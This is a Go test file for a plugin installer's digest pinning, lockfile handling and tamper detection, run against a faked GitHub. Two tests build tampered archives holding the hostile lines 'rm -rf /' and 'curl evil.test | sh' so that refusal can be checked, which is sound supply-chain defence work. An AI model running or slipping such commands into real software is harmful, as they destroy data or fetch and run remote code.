package plugindist

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/setthasit/Lore/internal/config"
	"github.com/setthasit/Lore/internal/errors/internalerror"
)

const stubBinary = "#!/bin/sh\necho lore-linear\n"

// scene is one plugin published on a faked GitHub, with a cache rooted in a
// temporary directory: no test writes to a real home or reaches the network.
type scene struct {
	fake      *fakeGitHub
	store     *Store
	installer *Installer
	dir       string
	coord     Coordinate
	asset     string
	archive   []byte
}

func newScene(t *testing.T) *scene {
	t.Helper()

	coord, err := Resolve(".", config.PluginDecl{Name: "linear", From: "github.com/jdoe/lore-linear@v0.3.1"})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	fake := newFakeGitHub(t, "jdoe", "lore-linear")
	store := NewStore(t.TempDir())
	asset := coord.AssetName(store.Platform())
	archive := archiveWith(t, coord.binaryName(store.Platform()), []byte(stubBinary))
	fake.publish("v0.3.1", map[string][]byte{asset: archive})

	return &scene{
		fake: fake, store: store, installer: fake.installer(store), dir: t.TempDir(),
		coord: coord, asset: asset, archive: archive,
	}
}

func (s *scene) install(t *testing.T, lock *Lock, rewrite bool) (Result, error) {
	t.Helper()

	return s.installer.Install(context.Background(), Request{Coordinate: s.coord, Rewrite: rewrite}, lock)
}

func (s *scene) installed(t *testing.T) (*Lock, Result) {
	t.Helper()

	lock := &Lock{}
	result, err := s.install(t, lock, false)
	if err != nil {
		t.Fatalf("install: %v", err)
	}
	return lock, result
}

func TestInstallPinsVerifiesAndCaches(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, result := scene.installed(t)

	if !result.Pinned || result.Locked {
		t.Fatalf("result pinned = %v, locked = %v; want a first install to pin", result.Pinned, result.Locked)
	}
	if want := digestOf(scene.archive); result.ArtifactDigest != want {
		t.Fatalf("artifact digest = %q, want %q", result.ArtifactDigest, want)
	}

	artifact, locked := lock.Artifact("linear", scene.store.Platform())
	if !locked {
		t.Fatalf("nothing locked for %s: %+v", scene.store.Platform(), lock.Plugins)
	}
	if artifact.Digest != result.ArtifactDigest {
		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.ArtifactDigest)
	}
	if artifact.URL != scene.fake.downloadURL("v0.3.1", scene.asset) {
		t.Fatalf("locked url = %q", artifact.URL)
	}

	// The layout is load-bearing: versions live in separate directories so
	// several may coexist, and the lockfile decides which one runs.
	want := filepath.Join(scene.store.Root(), "plugins", "linear", "v0.3.1", scene.coord.binaryName(scene.store.Platform()))
	if result.Binary != want {
		t.Fatalf("binary = %q, want %q", result.Binary, want)
	}
	if body := readFile(t, result.Binary); body != stubBinary {
		t.Fatalf("installed binary = %q, want the archive's entry", body)
	}
	if recorded := strings.TrimSpace(readFile(t, filepath.Join(filepath.Dir(result.Binary), digestFileName))); recorded != result.BinaryDigest {
		t.Fatalf("%s = %q, want %q", digestFileName, recorded, result.BinaryDigest)
	}

	path, err := scene.store.Binary("linear", scene.coord, lock)
	if err != nil {
		t.Fatalf("locate the installed binary: %v", err)
	}
	if path != result.Binary {
		t.Fatalf("located %q, want %q", path, result.Binary)
	}
}

// A mutated release asset is the attack the checksums file exists to catch on a
// first install, and nothing is written when it does.
func TestInstallRefusesATamperedArtifact(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	scene.fake.tamper("v0.3.1", scene.asset, archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("rm -rf /\n")))

	lock := &Lock{}
	_, err := scene.install(t, lock, false)
	if err == nil {
		t.Fatal("installing a tampered artifact succeeded, want a refusal")
	}
	if !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("error %q does not report a digest mismatch", err)
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a refused install pinned %+v", lock.Plugins)
	}
	if _, err := os.Stat(scene.store.Dir("linear", "v0.3.1")); !os.IsNotExist(err) {
		t.Fatal("a refused install left a cached version behind")
	}
}

// The locked digest is the pin, and it wins over anything the publisher serves
// afterwards: no flag makes this continue.
func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, first := scene.installed(t)

	// The publisher rewrites the release: new bytes, new checksums, same tag.
	rewritten := archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("curl evil.test | sh\n"))
	scene.fake.publish("v0.3.1", map[string][]byte{scene.asset: rewritten})

	_, err := scene.install(t, lock, false)
	if err == nil {
		t.Fatal("installing over a locked digest succeeded, want a refusal")
	}
	if !internalerror.IsPrecondition(err) {
		t.Fatalf("kind = %v, want precondition", internalerror.KindOf(err))
	}
	for _, want := range []string{"digest mismatch", first.ArtifactDigest, digestOf(rewritten)} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}

	artifact, _ := lock.Artifact("linear", scene.store.Platform())
	if artifact.Digest != first.ArtifactDigest {
		t.Fatalf("the refused install rewrote the pin to %q", artifact.Digest)
	}
}

// Update is the one command allowed to replace a locked digest, and install
// says so rather than silently doing nothing about a version it cannot reach.
func TestInstallRefusesAVersionTheLockDisagreesWith(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, _ := scene.installed(t)

	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.coord = moved

	if _, err := scene.install(t, lock, false); err == nil {
		t.Fatal("installing a version the lock disagrees with succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "lore plugin update linear") {
		t.Fatalf("error %q does not name the command that moves it", err)
	}
}

func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	lock, first := scene.installed(t)

	next := archiveWith(t, scene.coord.binaryName(scene.store.Platform()), []byte("#!/bin/sh\necho v0.4.0\n"))
	moved, err := scene.coord.AtVersion("v0.4.0")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}
	scene.coord = moved
	scene.fake.publish("v0.4.0", map[string][]byte{moved.AssetName(scene.store.Platform()): next})

	result, err := scene.install(t, lock, true)
	if err != nil {
		t.Fatalf("update: %v", err)
	}
	if result.ArtifactDigest == first.ArtifactDigest {
		t.Fatal("update kept the old digest")
	}

	entry, _ := lock.Entry("linear")
	if entry.Version != "v0.4.0" || entry.From != "github.com/jdoe/lore-linear@v0.4.0" {
		t.Fatalf("entry = %+v, want v0.4.0", entry)
	}
	artifact, _ := lock.Artifact("linear", scene.store.Platform())
	if artifact.Digest != result.ArtifactDigest {
		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.ArtifactDigest)
	}

	// Both versions coexist on disk; the lockfile is what decides which runs.
	if _, err := os.Stat(scene.store.Dir("linear", "v0.3.1")); err != nil {
		t.Fatalf("v0.3.1 was removed by an update: %v", err)
	}
}

// The failure has to name both sides: the publisher fixes their pipeline, and
// the reader cannot see the difference without the two lists.
func TestInstallMissingAssetNamesWhatWasLookedForAndWhatExists(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	store := scene.store.WithPlatform(Platform{OS: "plan9", Arch: "mips"})
	installer := scene.fake.installer(store)

	_, err := installer.Install(context.Background(), Request{Coordinate: scene.coord}, &Lock{})
	if err == nil {
		t.Fatal("installing for a platform with no asset succeeded, want a refusal")
	}
	for _, want := range []string{"lore-linear_0.3.1_plan9_mips.tar.gz", scene.asset, ChecksumsAsset} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not mention %q", err, want)
		}
	}
}

// An unresolvable coordinate aborts the install and writes nothing: the
// lockfile that is committed to the repository is left exactly as it was.
func TestInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	unknown, err := scene.coord.AtVersion("v9.9.9")
	if err != nil {
		t.Fatalf("move the coordinate: %v", err)
	}

	lock := &Lock{}
	_, err = scene.installer.Install(context.Background(), Request{Coordinate: unknown}, lock)
	if err == nil {
		t.Fatal("installing an unknown tag succeeded, want a refusal")
	}
	for _, want := range []string{"github.com/jdoe/lore-linear@v9.9.9", "tag v9.9.9", "404"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error %q does not name the coordinate and the step that failed: missing %q", err, want)
		}
	}

	if err := lockIsUnwritten(scene.dir); err != nil {
		t.Fatal(err)
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a refused install pinned %+v", lock.Plugins)
	}
}

func lockIsUnwritten(dir string) error {
	if _, err := os.Stat(lockPath(dir)); os.IsNotExist(err) {
		return nil
	}
	return &os.PathError{Op: "check", Path: lockPath(dir), Err: os.ErrExist}
}

// @latest is resolved once, by install, and what it resolved to is what the
// caller writes back into lore.yaml.
func TestInstallPinsLatestToAConcreteVersion(t *testing.T) {
	t.Parallel()

	scene := newScene(t)
	floating, err := ResolveInstall(".", "linear", "github.com/jdoe/lore-linear@latest")
	if err != nil {
		t.Fatalf("resolve @latest: %v", err)
	}
	if !floating.Floating() {
		t.Fatal("@latest does not report itself floating")
	}

	pinned, err := scene.installer.Pin(context.Background(), floating)
	if err != nil {
		t.Fatalf("pin: %v", err)
	}
	if pinned.Version != "v0.3.1" || pinned.From != "github.com/jdoe/lore-linear@v0.3.1" {
		t.Fatalf("pinned = %+v, want v0.3.1", pinned)
	}

	// A floating coordinate must never reach the installer, so the guard is
	// checked rather than assumed.
	if _, err := scene.installer.Install(context.Background(), Request{Coordinate: floating}, &Lock{}); err == nil {
		t.Fatal("installing a floating coordinate succeeded")
	}
}

// A locally-sourced plugin has no lock entry by construction. That is the whole
// cost of the escape hatch, and the warning says so.
func TestInstallLocalCoordinateIsNeverLocked(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	path := filepath.Join(dir, "lore-scratch")
	if err := os.WriteFile(path, []byte(stubBinary), 0o755); err != nil {
		t.Fatalf("seed a local plugin: %v", err)
	}

	coord, err := Resolve(".", config.PluginDecl{Name: "scratch", From: path})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	lock := &Lock{}
	installer := NewInstaller(NewStore(t.TempDir()))
	result, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock)
	if err != nil {
		t.Fatalf("install a local plugin: %v", err)
	}
	if result.Binary != path {
		t.Fatalf("binary = %q, want %q", result.Binary, path)
	}
	if len(lock.Plugins) != 0 {
		t.Fatalf("a local plugin was locked: %+v", lock.Plugins)
	}
	if !strings.Contains(result.Warning, "development only") {
		t.Fatalf("warning = %q", result.Warning)
	}
}

// A URL coordinate has no checksums file to read a digest out of, so the first
// fetch is what gets pinned — and the second fetch is checked against it.
func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
	t.Parallel()

	archive := archiveWith(t, "acme-crm", []byte(stubBinary))
	served := archive
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/lore/acme-crm/v2.0.1.tar.gz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(served)
	}))
	t.Cleanup(server.Close)

	coord, err := Resolve(".", config.PluginDecl{Name: "acme-crm", From: server.URL + "/lore/acme-crm/v2.0.1.tar.gz"})
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}

	store := NewStore(t.TempDir())
	installer := &Installer{Store: store, HTTP: server.Client()}
	lock := &Lock{}
	result, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock)
	if err != nil {
		t.Fatalf("install: %v", err)
	}
	if !result.Trust {
		t.Fatal("an unsigned URL artifact with nothing to compare against does not report trust on first use")
	}
	if result.Version != "v2.0.1" {
		t.Fatalf("version = %q, want v2.0.1 from the URL", result.Version)
	}

	served = archiveWith(t, "acme-crm", []byte("evil\n"))
	if _, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock); err == nil {
		t.Fatal("re-installing changed bytes over a pin succeeded, want a refusal")
	} else if !strings.Contains(err.Error(), "digest mismatch") {
		t.Fatalf("error %q does not report a digest mismatch", err)
	}
}
